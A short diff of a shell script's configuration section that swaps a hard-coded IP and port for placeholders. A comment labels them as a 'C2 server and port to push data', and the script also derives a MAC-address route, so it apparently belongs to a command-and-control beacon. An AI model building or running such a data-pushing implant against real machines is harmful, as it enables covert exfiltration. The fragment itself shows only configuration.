@@ -7,8 +7,8 @@
 #############		SCRIPT CONFIGURATION		##############
 ##############################################################
 # C2 server and port to push data
-server="192.168.1.50"
-port="5000"
+server="<C2-IP>"
+port="<C2-Port>"
 route="/fp/"
 mac=$( cat /sys/class/net/eth0/address | tr : _ ) # find MAC address and replace ":" with "_" for usage in route
 
